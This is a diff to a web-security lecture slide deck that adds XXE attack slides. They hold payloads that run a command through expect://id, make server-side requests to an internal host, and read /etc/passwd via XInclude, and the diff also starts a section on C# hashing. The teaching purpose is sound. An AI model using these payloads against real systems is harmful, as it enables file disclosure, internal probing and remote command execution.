@@ -255,6 +255,7 @@
 					<img src="./assets/xxe_scheme.png" alt="xxe scheme" width="600px">
 				</section>
 				<section>
+					<h6>read file</h6>
 					<pre class="php"><code data-trim data-noescape>
 					&lt;?php
 					  libxml_disable_entity_loader (false);
@@ -279,6 +280,7 @@
 				  	</code></pre>
 				</section>
 				<section>
+					<h6>RCE</h6>
 					<pre class="php"><code data-trim data-noescape>
 					&lt;?php
 					  libxml_disable_entity_loader (false);
@@ -291,7 +293,7 @@
 					  // ...
 					?&gt;
 				  	</code></pre>
-					<pre class="xml"><code data-trim data-noescape>
+					<pre class="xml"><code data-trim data-noescape data-line-numbers="3">
 					&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 					&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
 					&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;
@@ -301,7 +303,53 @@
 					&lt;/creds&gt;
 				  	</code></pre>
 				</section>
+				<section>
+					<img src="./assets/xxe_ssrf.png" alt="xxe ssrf scheme" width="461px">
+				</section>
+				<section>
+					<h6>xxe ssrf</h6>
+					<pre class="xml"><code data-trim data-noescape data-line-numbers="3">
+					&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+					&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+					&lt;!ENTITY xxe SYSTEM "http://internal.com" &gt;]&gt;
+					&lt;creds&gt;
+					  &lt;user&gt;&amp;xxe;&lt;/user&gt;
+					  &lt;pass&gt;pass&lt;/pass&gt;
+					&lt;/creds&gt;
+					</code></pre>
+				</section>
+				<section>
+					<h6>No doctype access</h6>
+					<pre class="xml"><code data-trim data-noescape>
+					&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+					&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;
+					</code></pre>
+				</section>
+				<section>
+					<ul>
+						<li>out of band</li>
+						<li>error based</li>
+					</ul>
+				</section>
+				<section>
+					<h2>Хэши</h2>
+				</section>
+				<section>
+					<pre class="csharp"><code data-trim data-noescape>
+						public class MyClass {
+						  public override bool Equals(object obj)
+						  {
+						    // ...
+						  }
 
+						  public override int GetHashCode()
+						  {
+						    // ...
+						  }
+						}
+					</code></pre>
+				</section>
+				<section></section>
 			</div>
 		</div>
 
